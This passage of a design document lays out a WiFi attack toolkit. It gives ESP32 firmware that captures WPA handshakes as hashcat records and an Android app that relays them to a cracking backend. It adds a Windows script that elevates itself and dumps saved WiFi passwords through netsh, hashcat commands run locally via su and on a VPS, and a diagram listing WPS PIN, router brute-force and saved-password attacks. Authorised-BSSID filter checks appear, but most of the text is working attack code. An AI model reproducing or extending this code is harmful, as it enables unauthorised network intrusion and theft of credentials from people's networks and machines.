    // Extract nonce (32 bytes at offset 17 from EAPOL-Key header)
    const uint8_t *nonce = eapol + 4 + 13;
    
    xSemaphoreTake(tracker_mutex, portMAX_DELAY);
    
    if (!mic_flag && ack) {
        // M1: AP → Client, no MIC, has ACK
        memcpy(tracker->anonce, nonce, 32);
        tracker->state = 1;
        tracker->last_update = esp_timer_get_time();
    }
    else if (mic_flag && !install && !ack && tracker->state == 1) {
        // M2: Client → AP, has MIC, no Install, no ACK
        memcpy(tracker->snonce, nonce, 32);
        memcpy(tracker->mic, eapol + 4 + 77, 16);  // MIC at offset 77
        
        // Store raw EAPOL frame (without MIC) for hashcat
        tracker->eapol_len = MIN(eapol_len, sizeof(tracker->eapol_data));
        memcpy(tracker->eapol_data, eapol, tracker->eapol_len);
        // Zero the MIC field in stored data (hashcat requirement)
        memset(tracker->eapol_data + 4 + 77, 0, 16);
        
        tracker->state = 2;
        tracker->last_update = esp_timer_get_time();
        
        // We have M1+M2 - complete handshake for cracking!
        emit_handshake_capture(tracker);
    }
    
    xSemaphoreGive(tracker_mutex);
}

static void emit_handshake_capture(handshake_tracker_t *tracker) {
    // Build hashcat 22000 record
    char hashcat_record[512];
    hashcat_format_eapol(
        tracker->bssid,
        tracker->client_mac,
        tracker->anonce,
        tracker->snonce,
        tracker->mic,
        tracker->eapol_data,
        tracker->eapol_len,
        hashcat_record,
        sizeof(hashcat_record)
    );
    
    // Get SSID
    char ssid[33];
    uint8_t ssid_len;
    get_ssid_for_bssid(tracker->bssid, ssid, &ssid_len);
    
    // Transmit via BLE
    ble_service_send_capture(
        CAPTURE_KIND_EAPOL,
        tracker->bssid,
        ssid, ssid_len,
        hashcat_record, strlen(hashcat_record)
    );
    
    // Reset tracker
    tracker->state = 0;
}
```

### 5.3.4 BLE Service

```c
// ble_service.c

#include "nimble/nimble_port.h"
#include "nimble/nimble_port_freertos.h"
#include "host/ble_hs.h"
#include "services/gap/ble_svc_gap.h"
#include "services/gatt/ble_svc_gatt.h"

// Service UUIDs
static const ble_uuid128_t SERVICE_UUID = 
    BLE_UUID128_INIT(0x01, 0x9d, 0x2b, 0x6f, 0x3a, 0x7e, 0x0d, 0x9c,
                     0x0e, 0x4d, 0x4e, 0x1c, 0x01, 0x80, 0x9c, 0x7f);

static const ble_uuid128_t CAPTURE_CHAR_UUID =
    BLE_UUID128_INIT(0x01, 0x9d, 0x2b, 0x6f, 0x3a, 0x7e, 0x0d, 0x9c,
                     0x0e, 0x4d, 0x4e, 0x1c, 0x02, 0x80, 0x9c, 0x7f);

static const ble_uuid128_t CONFIG_CHAR_UUID =
    BLE_UUID128_INIT(0x01, 0x9d, 0x2b, 0x6f, 0x3a, 0x7e, 0x0d, 0x9c,
                     0x0e, 0x4d, 0x4e, 0x1c, 0x03, 0x80, 0x9c, 0x7f);

static const ble_uuid128_t STATUS_CHAR_UUID =
    BLE_UUID128_INIT(0x01, 0x9d, 0x2b, 0x6f, 0x3a, 0x7e, 0x0d, 0x9c,
                     0x0e, 0x4d, 0x4e, 0x1c, 0x04, 0x80, 0x9c, 0x7f);

static uint16_t conn_handle = BLE_HS_CONN_HANDLE_NONE;
static uint16_t capture_notify_handle;
static uint16_t status_notify_handle;

// Capture buffer for fragmentation (MTU may be 20 bytes)
static uint8_t capture_buffer[512];
static size_t capture_buffer_len = 0;

void ble_service_send_capture(uint8_t kind, const uint8_t *bssid,
                               const char *ssid, uint8_t ssid_len,
                               const char *payload, size_t payload_len) {
    if (conn_handle == BLE_HS_CONN_HANDLE_NONE) {
        // No connection, buffer for later or discard
        return;
    }
    
    // Build capture frame
    size_t frame_len = 1 + 1 + 6 + 1 + ssid_len + 2 + payload_len;
    if (frame_len > sizeof(capture_buffer)) {
        return;  // Too large
    }
    
    uint8_t *ptr = capture_buffer;
    
    // Version
    *ptr++ = 0x01;
    
    // Kind
    *ptr++ = kind;
    
    // BSSID (6 bytes, raw)
    memcpy(ptr, bssid, 6);
    ptr += 6;
    
    // SSID length + SSID
    *ptr++ = ssid_len;
    memcpy(ptr, ssid, ssid_len);
    ptr += ssid_len;
    
    // Payload length (little-endian)
    *ptr++ = payload_len & 0xFF;
    *ptr++ = (payload_len >> 8) & 0xFF;
    
    // Payload
    memcpy(ptr, payload, payload_len);
    ptr += payload_len;
    
    capture_buffer_len = ptr - capture_buffer;
    
    // Send via notify (may need fragmentation for large payloads)
    struct os_mbuf *om = ble_hs_mbuf_from_flat(capture_buffer, capture_buffer_len);
    if (om) {
        ble_gattc_notify_custom(conn_handle, capture_notify_handle, om);
    }
}

static int config_write_handler(uint16_t conn_handle, uint16_t attr_handle,
                                 struct ble_gatt_access_ctxt *ctxt, void *arg) {
    // Parse authorized BSSID list from write
    // Format: "AA:BB:CC:DD:EE:FF,11:22:33:44:55:66,..."
    
    char config_str[512];
    uint16_t len = OS_MBUF_PKTLEN(ctxt->om);
    if (len >= sizeof(config_str)) {
        return BLE_ATT_ERR_INVALID_ATTR_VALUE_LEN;
    }
    
    ble_hs_mbuf_to_flat(ctxt->om, config_str, len, NULL);
    config_str[len] = '\0';
    
    // Parse and update scope filter
    scope_filter_set_authorized(config_str);
    
    return 0;
}

// GATT service definition
static const struct ble_gatt_svc_def gatt_svcs[] = {
    {
        .type = BLE_GATT_SVC_TYPE_PRIMARY,
        .uuid = &SERVICE_UUID.u,
        .characteristics = (struct ble_gatt_chr_def[]) {
            {
                .uuid = &CAPTURE_CHAR_UUID.u,
                .access_cb = NULL,  // Notify only
                .flags = BLE_GATT_CHR_F_NOTIFY,
                .val_handle = &capture_notify_handle,
            },
            {
                .uuid = &CONFIG_CHAR_UUID.u,
                .access_cb = config_write_handler,
                .flags = BLE_GATT_CHR_F_WRITE,
            },
            {
                .uuid = &STATUS_CHAR_UUID.u,
                .access_cb = status_read_handler,
                .flags = BLE_GATT_CHR_F_READ | BLE_GATT_CHR_F_NOTIFY,
                .val_handle = &status_notify_handle,
            },
            { 0 }  // Terminator
        },
    },
    { 0 }  // Terminator
};

void ble_service_init(void) {
    ble_svc_gap_init();
    ble_svc_gatt_init();
    
    ble_gatts_count_cfg(gatt_svcs);
    ble_gatts_add_svcs(gatt_svcs);
    
    ble_svc_gap_device_name_set("WF-Sniffer");
    
    // Start advertising
    struct ble_gap_adv_params adv_params = {
        .conn_mode = BLE_GAP_CONN_MODE_UND,
        .disc_mode = BLE_GAP_DISC_MODE_GEN,
    };
    ble_gap_adv_start(BLE_OWN_ADDR_PUBLIC, NULL, BLE_HS_FOREVER,
                      &adv_params, gap_event_handler, NULL);
}
```

### 5.3.5 Scope Filter

```c
// scope_filter.c

#include "scope_filter.h"

#define MAX_AUTHORIZED_BSSIDS 32

static uint8_t authorized_bssids[MAX_AUTHORIZED_BSSIDS][6];
static int authorized_count = 0;
static SemaphoreHandle_t scope_mutex;

void scope_filter_init(void) {
    scope_mutex = xSemaphoreCreateMutex();
    authorized_count = 0;
}

bool scope_filter_is_authorized(const uint8_t *bssid) {
    xSemaphoreTake(scope_mutex, portMAX_DELAY);
    
    for (int i = 0; i < authorized_count; i++) {
        if (memcmp(bssid, authorized_bssids[i], 6) == 0) {
            xSemaphoreGive(scope_mutex);
            return true;
        }
    }
    
    xSemaphoreGive(scope_mutex);
    return false;
}

void scope_filter_set_authorized(const char *csv_list) {
    xSemaphoreTake(scope_mutex, portMAX_DELAY);
    
    authorized_count = 0;
    
    // Parse CSV: "AA:BB:CC:DD:EE:FF,11:22:33:44:55:66,..."
    const char *ptr = csv_list;
    while (*ptr && authorized_count < MAX_AUTHORIZED_BSSIDS) {
        // Skip whitespace
        while (*ptr == ' ' || *ptr == ',') ptr++;
        if (!*ptr) break;
        
        // Parse MAC address
        uint8_t mac[6];
        if (sscanf(ptr, "%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx",
                   &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]) == 6) {
            memcpy(authorized_bssids[authorized_count], mac, 6);
            authorized_count++;
        }
        
        // Skip to next comma or end
        while (*ptr && *ptr != ',') ptr++;
    }
    
    xSemaphoreGive(scope_mutex);
    
    ESP_LOGI("SCOPE", "Updated authorized BSSIDs: %d entries", authorized_count);
}
```

## 5.4 Build Configuration

### 5.4.1 CMakeLists.txt

```cmake
cmake_minimum_required(VERSION 3.16)

set(EXTRA_COMPONENT_DIRS $ENV{IDF_PATH}/components/bt/host/nimble)

include($ENV{IDF_PATH}/tools/cmake/project.cmake)
project(wf-sniffer)
```

### 5.4.2 sdkconfig.defaults

```
# WiFi Configuration
CONFIG_ESP32_WIFI_STATIC_RX_BUFFER_NUM=16
CONFIG_ESP32_WIFI_DYNAMIC_RX_BUFFER_NUM=32
CONFIG_ESP32_WIFI_DYNAMIC_TX_BUFFER_NUM=32
CONFIG_ESP32_WIFI_AMPDU_RX_ENABLED=y
CONFIG_ESP32_WIFI_RX_BA_WIN=16
CONFIG_ESP32_WIFI_SOFTAP_BEACON_MAX_LEN=752

# BLE Configuration (NimBLE)
CONFIG_BT_ENABLED=y
CONFIG_BT_NIMBLE_ENABLED=y
CONFIG_BT_NIMBLE_ROLE_PERIPHERAL=y
CONFIG_BT_NIMBLE_ROLE_CENTRAL=n
CONFIG_BT_NIMBLE_ROLE_OBSERVER=n
CONFIG_BT_NIMBLE_ROLE_BROADCASTER=y
CONFIG_BT_NIMBLE_MAX_CONNECTIONS=1
CONFIG_BT_NIMBLE_ATT_PREFERRED_MTU=512

# Promiscuous mode
CONFIG_ESP32_WIFI_PROMISCUOUS_ENABLED=y

# FreeRTOS
CONFIG_FREERTOS_HZ=1000

# Logging
CONFIG_LOG_DEFAULT_LEVEL_INFO=y
```

---

# 6. ANDROID LAYER B COMPLETION

## 6.1 BleSnifferClient Completion

The existing `BleSnifferClient.kt` needs real BLE implementation:

```kotlin
// core/data/src/main/java/com/alexcupsa/wifithermal/core/data/ble/BleSnifferClient.kt

@Singleton
class BleSnifferClient @Inject constructor(
    @ApplicationContext private val context: Context,
    private val scopeGuard: OffensiveScopeGuard,
    private val captureRepository: CapturedHandshakeRepository,
    private val dispatchers: DispatcherProvider,
) {
    private val bluetoothManager = context.getSystemService(Context.BLUETOOTH_SERVICE) as BluetoothManager
    private val bluetoothAdapter: BluetoothAdapter? = bluetoothManager.adapter
    
    private var bluetoothGatt: BluetoothGatt? = null
    private var captureCharacteristic: BluetoothGattCharacteristic? = null
    private var configCharacteristic: BluetoothGattCharacteristic? = null
    
    private val _connectionState = MutableStateFlow<ConnectionState>(ConnectionState.Disconnected)
    val connectionState: StateFlow<ConnectionState> = _connectionState.asStateFlow()
    
    private val _captures = MutableSharedFlow<CapturedHandshake>(extraBufferCapacity = 64)
    val captures: SharedFlow<CapturedHandshake> = _captures.asSharedFlow()
    
    companion object {
        private val SERVICE_UUID = UUID.fromString("7f9c8001-1c4e-4d0e-9c0d-7e3a6f2b9d01")
        private val CAPTURE_CHAR_UUID = UUID.fromString("7f9c8002-1c4e-4d0e-9c0d-7e3a6f2b9d01")
        private val CONFIG_CHAR_UUID = UUID.fromString("7f9c8003-1c4e-4d0e-9c0d-7e3a6f2b9d01")
        private val STATUS_CHAR_UUID = UUID.fromString("7f9c8004-1c4e-4d0e-9c0d-7e3a6f2b9d01")
        private val CCCD_UUID = UUID.fromString("00002902-0000-1000-8000-00805f9b34fb")
        
        private const val SCAN_TIMEOUT_MS = 10_000L
    }
    
    sealed class ConnectionState {
        object Disconnected : ConnectionState()
        object Scanning : ConnectionState()
        data class Connecting(val deviceAddress: String) : ConnectionState()
        data class Connected(val deviceName: String?) : ConnectionState()
        data class Error(val message: String) : ConnectionState()
    }
    
    suspend fun scanAndConnect(): Result<Unit> = withContext(dispatchers.io) {
        if (bluetoothAdapter == null || !bluetoothAdapter.isEnabled) {
            return@withContext Result.failure(ConnectionError.BleNotAvailable())
        }
        
        _connectionState.value = ConnectionState.Scanning
        
        try {
            val device = scanForDevice() ?: return@withContext Result.failure(
                ConnectionError.DeviceNotFound(null)
            )
            
            _connectionState.value = ConnectionState.Connecting(device.address)
            
            connectToDevice(device)
            
            Result.success(Unit)
        } catch (e: Exception) {
            _connectionState.value = ConnectionState.Error(e.message ?: "Unknown error")
            Result.failure(e)
        }
    }
    
    private suspend fun scanForDevice(): BluetoothDevice? = suspendCancellableCoroutine { cont ->
        val scanner = bluetoothAdapter?.bluetoothLeScanner ?: run {
            cont.resume(null)
            return@suspendCancellableCoroutine
        }
        
        val scanFilter = ScanFilter.Builder()
            .setServiceUuid(ParcelUuid(SERVICE_UUID))
            .build()
        
        val scanSettings = ScanSettings.Builder()
            .setScanMode(ScanSettings.SCAN_MODE_LOW_LATENCY)
            .build()
        
        var scanCallback: ScanCallback? = null
        
        val timeoutJob = CoroutineScope(dispatchers.io).launch {
            delay(SCAN_TIMEOUT_MS)
            scanCallback?.let { scanner.stopScan(it) }
            if (cont.isActive) cont.resume(null)
        }
        
        scanCallback = object : ScanCallback() {
            override fun onScanResult(callbackType: Int, result: ScanResult) {
                timeoutJob.cancel()
                scanner.stopScan(this)
                if (cont.isActive) cont.resume(result.device)
            }
            
            override fun onScanFailed(errorCode: Int) {
                timeoutJob.cancel()
                if (cont.isActive) cont.resume(null)
            }
        }
        
        scanner.startScan(listOf(scanFilter), scanSettings, scanCallback)
        
        cont.invokeOnCancellation {
            timeoutJob.cancel()
            scanner.stopScan(scanCallback)
        }
    }
    
    private suspend fun connectToDevice(device: BluetoothDevice) = suspendCancellableCoroutine<Unit> { cont ->
        val gattCallback = object : BluetoothGattCallback() {
            override fun onConnectionStateChange(gatt: BluetoothGatt, status: Int, newState: Int) {
                when (newState) {
                    BluetoothProfile.STATE_CONNECTED -> {
                        bluetoothGatt = gatt
                        gatt.discoverServices()
                    }
                    BluetoothProfile.STATE_DISCONNECTED -> {
                        _connectionState.value = ConnectionState.Disconnected
                        cleanup()
                    }
                }
            }
            
            override fun onServicesDiscovered(gatt: BluetoothGatt, status: Int) {
                if (status != BluetoothGatt.GATT_SUCCESS) {
                    if (cont.isActive) cont.resumeWithException(
                        ConnectionError.GattError(status)
                    )
                    return
                }
                
                val service = gatt.getService(SERVICE_UUID)
                if (service == null) {
                    if (cont.isActive) cont.resumeWithException(
                        ConnectionError.CharacteristicNotFound(SERVICE_UUID.toString())
                    )
                    return
                }
                
                captureCharacteristic = service.getCharacteristic(CAPTURE_CHAR_UUID)
                configCharacteristic = service.getCharacteristic(CONFIG_CHAR_UUID)
                
                // Enable notifications on capture characteristic
                captureCharacteristic?.let { char ->
                    gatt.setCharacteristicNotification(char, true)
                    char.getDescriptor(CCCD_UUID)?.let { desc ->
                        desc.value = BluetoothGattDescriptor.ENABLE_NOTIFICATION_VALUE
                        gatt.writeDescriptor(desc)
                    }
                }
                
                _connectionState.value = ConnectionState.Connected(device.name)
                if (cont.isActive) cont.resume(Unit)
            }
            
            override fun onCharacteristicChanged(
                gatt: BluetoothGatt,
                characteristic: BluetoothGattCharacteristic,
                value: ByteArray
            ) {
                if (characteristic.uuid == CAPTURE_CHAR_UUID) {
                    processCaptureFrame(value)
                }
            }
        }
        
        device.connectGatt(context, false, gattCallback, BluetoothDevice.TRANSPORT_LE)
    }
    
    private fun processCaptureFrame(data: ByteArray) {
        try {
            val frame = BleSnifferProtocol.parseFrame(data)
            
            // SCOPE CHECK: Verify BSSID is authorized
            if (!scopeGuard.isAuthorized(frame.bssid)) {
                // Silently discard out-of-scope captures
                return
            }
            
            val capture = CapturedHandshake(
                id = 0,
                bssid = frame.bssid,
                ssid = frame.ssid,
                captureType = when (frame.kind) {
                    BleSnifferProtocol.KIND_PMKID -> CaptureType.PMKID
                    BleSnifferProtocol.KIND_EAPOL -> CaptureType.EAPOL
                    else -> return
                },
                hashcatRecord = String(frame.payload, Charsets.UTF_8),
                capturedAt = Instant.now(),
                status = CaptureStatus.PENDING,
                submittedAt = null,
                crackedAt = null,
                password = null,
            )
            
            // Persist to database
            CoroutineScope(dispatchers.io).launch {
                captureRepository.insert(capture)
            }
            
            // Emit to UI
            _captures.tryEmit(capture)
            
        } catch (e: Exception) {
            // Log malformed frame but don't crash
        }
    }
    
    suspend fun sendAuthorizedBssids(bssids: List<String>): Result<Unit> {
        val gatt = bluetoothGatt ?: return Result.failure(ConnectionError.DeviceNotFound(null))
        val config = configCharacteristic ?: return Result.failure(
            ConnectionError.CharacteristicNotFound(CONFIG_CHAR_UUID.toString())
        )
        
        // Format: "AA:BB:CC:DD:EE:FF,11:22:33:44:55:66,..."
        val payload = bssids.joinToString(",")
        
        return try {
            config.value = payload.toByteArray(Charsets.UTF_8)
            gatt.writeCharacteristic(config)
            Result.success(Unit)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }
    
    fun disconnect() {
        bluetoothGatt?.disconnect()
        cleanup()
    }
    
    private fun cleanup() {
        bluetoothGatt?.close()
        bluetoothGatt = null
        captureCharacteristic = null
        configCharacteristic = null
    }
}
```

## 6.2 CrackingBackendClient Implementation

```kotlin
// core/data/src/main/java/com/alexcupsa/wifithermal/core/data/cracking/CrackingBackendClient.kt

@Singleton
class CrackingBackendClient @Inject constructor(
    @ApplicationContext private val context: Context,
    private val scopeGuard: OffensiveScopeGuard,
    private val config: AppConfig,
) {
    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(60, TimeUnit.SECONDS)
        .writeTimeout(60, TimeUnit.SECONDS)
        // Add client certificate if using mTLS
        .build()
    
    private val json = Json { 
        ignoreUnknownKeys = true
        encodeDefaults = true
    }
    
    private val baseUrl: String
        get() = config.backendUrl
    
    suspend fun submitCapture(capture: CapturedHandshake): Result<SubmissionResponse> {
        // SCOPE CHECK at submission time
        if (!scopeGuard.isAuthorized(capture.bssid)) {
            return Result.failure(ScopeError.UnauthorizedBssid(capture.bssid))
        }
        
        val request = SubmitRequest(
            bssid = capture.bssid,
            ssid = capture.ssid,
            captureType = capture.captureType.name.lowercase(),
            hashcatRecord = capture.hashcatRecord,
            priority = "normal",
            wordlists = listOf("rockyou", "crackstation"),
            rules = listOf("best64"),
            timeoutHours = 24,
        )
        
        return try {
            val response = executeRequest(
                method = "POST",
                path = "/api/v1/captures",
                body = json.encodeToString(request),
            )
            
            val submissionResponse = json.decodeFromString<SubmissionResponse>(response)
            Result.success(submissionResponse)
        } catch (e: Exception) {
            when (e) {
                is SocketTimeoutException -> Result.failure(BackendError.Unreachable(baseUrl))
                is IOException -> Result.failure(BackendError.Unreachable(baseUrl))
                else -> Result.failure(e)
            }
        }
    }
    
    suspend fun getStatus(jobId: String): Result<JobStatus> {
        return try {
            val response = executeRequest(
                method = "GET",
                path = "/api/v1/captures/$jobId",
            )
            val status = json.decodeFromString<JobStatus>(response)
            Result.success(status)
        } catch (e: Exception) {
            when (e) {
                is SocketTimeoutException -> Result.failure(BackendError.Unreachable(baseUrl))
                else -> Result.failure(e)
            }
        }
    }
    
    suspend fun getResult(jobId: String): Result<CrackResult> {
        return try {
            val response = executeRequest(
                method = "GET",
                path = "/api/v1/captures/$jobId/result",
            )
            val result = json.decodeFromString<CrackResult>(response)
            Result.success(result)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }
    
    private suspend fun executeRequest(
        method: String,
        path: String,
        body: String? = null,
    ): String = withContext(Dispatchers.IO) {
        val url = "$baseUrl$path"
        
        val requestBuilder = Request.Builder()
            .url(url)
            .addHeader("Content-Type", "application/json")
            .addHeader("X-API-Key", config.apiKey)
        
        when (method) {
            "GET" -> requestBuilder.get()
            "POST" -> requestBuilder.post(body!!.toRequestBody("application/json".toMediaType()))
            "DELETE" -> requestBuilder.delete()
        }
        
        val response = client.newCall(requestBuilder.build()).execute()
        
        if (!response.isSuccessful) {
            throw when (response.code) {
                401, 403 -> BackendError.AuthenticationFailed()
                429 -> BackendError.RateLimited(
                    response.header("Retry-After")?.toLongOrNull()?.times(1000) ?: 60000
                )
                404 -> BackendError.JobNotFound(path)
                else -> IOException("HTTP ${response.code}: ${response.message}")
            }
        }
        
        response.body?.string() ?: throw IOException("Empty response body")
    }
}

@Serializable
data class SubmitRequest(
    val bssid: String,
    val ssid: String,
    @SerialName("capture_type") val captureType: String,
    @SerialName("hashcat_record") val hashcatRecord: String,
    val priority: String,
    val wordlists: List<String>,
    val rules: List<String>,
    @SerialName("timeout_hours") val timeoutHours: Int,
)

@Serializable
data class SubmissionResponse(
    @SerialName("job_id") val jobId: String,
    val status: String,
    val position: Int?,
    @SerialName("estimated_start") val estimatedStart: String?,
)

@Serializable
data class JobStatus(
    @SerialName("job_id") val jobId: String,
    val status: String,  // "queued", "running", "cracked", "exhausted", "error"
    @SerialName("progress_percent") val progressPercent: Double?,
    @SerialName("speed_hashes_per_sec") val speedHashesPerSec: Long?,
    @SerialName("candidates_tried") val candidatesTried: Long?,
    @SerialName("estimated_completion") val estimatedCompletion: String?,
)

@Serializable
data class CrackResult(
    @SerialName("job_id") val jobId: String,
    val status: String,
    val password: String?,
    @SerialName("found_at") val foundAt: String?,
    @SerialName("time_taken_seconds") val timeTakenSeconds: Long?,
    val method: String?,
)
```

---

# 7. WINDOWS COMPANION TOOL

## 7.1 Architecture

The Windows companion is a simple PowerShell/Python script that extracts saved WiFi passwords from the local system.

```
windows-companion/
├── wifi_extractor.py      # Main extraction script
├── requirements.txt       # Dependencies
├── config.json           # Configuration
└── README.md             # Usage instructions
```

## 7.2 Implementation

```python
#!/usr/bin/env python3
"""
WiFi Profile Extractor for Windows
Extracts saved WiFi passwords from the local system using netsh.

Usage:
    python wifi_extractor.py [--json] [--output FILE]

Output formats:
    --json    Output as JSON (default is human-readable)
    --output  Write to file instead of stdout
"""

import subprocess
import re
import json
import argparse
import sys
from dataclasses import dataclass
from typing import List, Optional


@dataclass
class WifiProfile:
    ssid: str
    auth_type: str
    cipher: str
    password: Optional[str]
    bssid: Optional[str] = None


def get_profile_names() -> List[str]:
    """Get list of all saved WiFi profile names."""
    try:
        result = subprocess.run(
            ["netsh", "wlan", "show", "profiles"],
            capture_output=True,
            text=True,
            encoding='utf-8',
            errors='replace',
            creationflags=subprocess.CREATE_NO_WINDOW,
        )
        
        profiles = []
        for line in result.stdout.split('\n'):
            # Look for "All User Profile" or "Profilo tutti gli utenti" (Italian)
            match = re.search(r':\s*(.+)$', line)
            if match and ('Profile' in line or 'Profilo' in line or 'profil' in line.lower()):
                profile_name = match.group(1).strip()
                if profile_name:
                    profiles.append(profile_name)
        
        return profiles
    except Exception as e:
        print(f"Error getting profiles: {e}", file=sys.stderr)
        return []


def get_profile_details(profile_name: str) -> Optional[WifiProfile]:
    """Get detailed information about a WiFi profile including password."""
    try:
        result = subprocess.run(
            ["netsh", "wlan", "show", "profile", f"name={profile_name}", "key=clear"],
            capture_output=True,
            text=True,
            encoding='utf-8',
            errors='replace',
            creationflags=subprocess.CREATE_NO_WINDOW,
        )
        
        output = result.stdout
        
        # Parse authentication type
        auth_match = re.search(r'(?:Authentication|Autenticazione)\s*:\s*(.+)', output, re.IGNORECASE)
        auth_type = auth_match.group(1).strip() if auth_match else "Unknown"
        
        # Parse cipher
        cipher_match = re.search(r'(?:Cipher|Crittografia)\s*:\s*(.+)', output, re.IGNORECASE)
        cipher = cipher_match.group(1).strip() if cipher_match else "Unknown"
        
        # Parse password (key content)
        # English: "Key Content", Italian: "Contenuto chiave", French: "Contenu de la clé"
        key_match = re.search(
            r'(?:Key Content|Contenuto chiave|Contenu de la cl[eé]|Schlüsselinhalt)\s*:\s*(.+)',
            output,
            re.IGNORECASE
        )
        password = key_match.group(1).strip() if key_match else None
        
        return WifiProfile(
            ssid=profile_name,
            auth_type=auth_type,
            cipher=cipher,
            password=password,
        )
    except Exception as e:
        print(f"Error getting profile '{profile_name}': {e}", file=sys.stderr)
        return None


def extract_all_profiles() -> List[WifiProfile]:
    """Extract all WiFi profiles with passwords."""
    profiles = []
    
    for name in get_profile_names():
        profile = get_profile_details(name)
        if profile:
            profiles.append(profile)
    
    return profiles


def format_human_readable(profiles: List[WifiProfile]) -> str:
    """Format profiles for human-readable output."""
    lines = []
    lines.append("=" * 60)
    lines.append("SAVED WIFI PROFILES")
    lines.append("=" * 60)
    
    for profile in profiles:
        lines.append("")
        lines.append(f"SSID: {profile.ssid}")
        lines.append(f"  Auth Type: {profile.auth_type}")
        lines.append(f"  Cipher: {profile.cipher}")
        if profile.password:
            lines.append(f"  Password: {profile.password}")
        else:
            lines.append(f"  Password: (not available or open network)")
        lines.append("-" * 60)
    
    lines.append("")
    lines.append(f"Total profiles: {len(profiles)}")
    lines.append(f"With passwords: {len([p for p in profiles if p.password])}")
    
    return '\n'.join(lines)


def format_json(profiles: List[WifiProfile]) -> str:
    """Format profiles as JSON."""
    data = {
        "profiles": [
            {
                "ssid": p.ssid,
                "auth_type": p.auth_type,
                "cipher": p.cipher,
                "password": p.password,
            }
            for p in profiles
        ],
        "total": len(profiles),
        "with_passwords": len([p for p in profiles if p.password]),
    }
    return json.dumps(data, indent=2, ensure_ascii=False)


def main():
    parser = argparse.ArgumentParser(description="Extract saved WiFi passwords from Windows")
    parser.add_argument("--json", action="store_true", help="Output as JSON")
    parser.add_argument("--output", "-o", help="Write to file instead of stdout")
    args = parser.parse_args()
    
    # Check if running as administrator (required for key=clear)
    try:
        import ctypes
        is_admin = ctypes.windll.shell32.IsUserAnAdmin()
    except:
        is_admin = False
    
    if not is_admin:
        print("WARNING: Not running as administrator. Passwords may not be visible.", file=sys.stderr)
        print("Run with elevated privileges for full output.", file=sys.stderr)
        print("", file=sys.stderr)
    
    profiles = extract_all_profiles()
    
    if args.json:
        output = format_json(profiles)
    else:
        output = format_human_readable(profiles)
    
    if args.output:
        with open(args.output, 'w', encoding='utf-8') as f:
            f.write(output)
        print(f"Output written to {args.output}")
    else:
        print(output)


if __name__ == "__main__":
    main()
```

## 7.3 Batch Wrapper

```batch
@echo off
REM wifi_extractor.bat - Run WiFi extraction with admin privileges

:: Check for admin rights
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Requesting administrator privileges...
    powershell -Command "Start-Process '%~dpnx0' -Verb RunAs"
    exit /b
)

:: Run the Python script
cd /d "%~dp0"
python wifi_extractor.py %*
pause
```

---

# 8. CRACKING OPTIONS

## 8.1 Overview

Cracking runs in one of three modes, selected by the operator:

1. **Local (Termux)**: hashcat runs on device via Termux with OpenCL support
2. **Local (Root Shell)**: hashcat compiled for ARM executed via su
3. **Remote (VPS)**: Lightweight script on VPS with GPU, no Redis/Docker overhead

## 8.2 Local Cracking (Termux)

Install hashcat in Termux:
```bash
pkg install hashcat
```

Execute from Android app via Termux:API or direct shell:
```kotlin
val process = Runtime.getRuntime().exec(arrayOf(
    "su", "-c",
    "hashcat -m 22000 -a 0 /data/local/tmp/capture.22000 /data/local/tmp/rockyou.txt"
))
```

## 8.3 Remote Cracking (VPS)

Single Python script, no FastAPI/Redis/Docker. SSH or simple HTTP POST.

```python
#!/usr/bin/env python3
# remote_crack.py - Standalone hashcat wrapper for VPS

import subprocess
import sys
import json
from pathlib import Path

WORDLISTS = ["/opt/wordlists/rockyou.txt"]
RULES = ["/usr/share/hashcat/rules/best64.rule"]

def crack(hash_file: str) -> dict:
    pot_file = hash_file + ".pot"
    cmd = ["hashcat", "-m", "22000", "-a", "0", hash_file]
    cmd.extend(WORDLISTS)
    for rule in RULES:
        if Path(rule).exists():
            cmd.extend(["-r", rule])
    cmd.extend(["--potfile-path", pot_file, "-o", pot_file])
    
    result = subprocess.run(cmd, capture_output=True, text=True)
    
    if Path(pot_file).exists():
        content = Path(pot_file).read_text().strip()
        if ":" in content:
            return {"status": "cracked", "password": content.split(":")[-1]}
    
    if result.returncode == 1:
        return {"status": "exhausted"}
    return {"status": "failed", "error": result.stderr}

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: remote_crack.py <hash_file>")
        sys.exit(1)
    print(json.dumps(crack(sys.argv[1])))
```

Usage from Android: SCP hash file to VPS, execute script via SSH, retrieve result.

## 8.4 Architecture (Reduced)

```
backend/
├── remote_crack.py          # Single standalone script
└── README.md                # Setup instructions
```

The existing `backend/` directory contains FastAPI/Redis code from an earlier iteration. This can be used as reference for building a more complex server if needed, but the standalone script above is sufficient for most use cases.

---

# 9. ANDROID-CENTRIC ARCHITECTURE

## 9.1 End-to-End Flow (Standalone APK)

```
┌─────────────────────────────────────────────────────────────────────┐
│                    ANDROID APP (ROOT REQUIRED)                      │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  ┌─────────────────────────────────────────────────────────────┐   │
│  │                    ATTACK VECTORS                            │   │
│  ├─────────────────────────────────────────────────────────────┤   │
│  │                                                              │   │
│  │  [Saved Passwords]     [Vendor Keygen]     [Router Admin]   │   │
│  │  /data/misc/wifi/      ISP default algo    Dashboard brute  │   │
│  │       │                     │                   │           │   │
│  │  [WPS PIN Attack]      [PMKID/EAPOL]       [Monitor Mode]   │   │
│  │  reaver/bully          ESP32 or local      airmon-ng        │   │
│  │       │                     │                   │           │   │
│  │       └─────────────────────┴───────────────────┘           │   │
│  │                             │                                │   │
│  └─────────────────────────────┼────────────────────────────────┘   │
│                                ▼                                    │
│  ┌─────────────────────────────────────────────────────────────┐   │
│  │                    CRACKING OPTIONS                          │   │
│  ├─────────────────────────────────────────────────────────────┤   │
│  │                                                              │   │
│  │  Option 1: LOCAL (Termux)                                   │   │
│  │  hashcat via Termux + OpenCL                                │   │
│  │                                                              │   │
│  │  Option 2: LOCAL (Root Shell)                               │   │
│  │  hashcat ARM binary via su -c                               │   │
│  │                                                              │   │
│  │  Option 3: REMOTE (VPS)                                     │   │
│  │  SCP hash file → SSH exec remote_crack.py → retrieve result │   │
│  │                                                              │   │
│  └─────────────────────────────────────────────────────────────┘   │
│                                                                     │
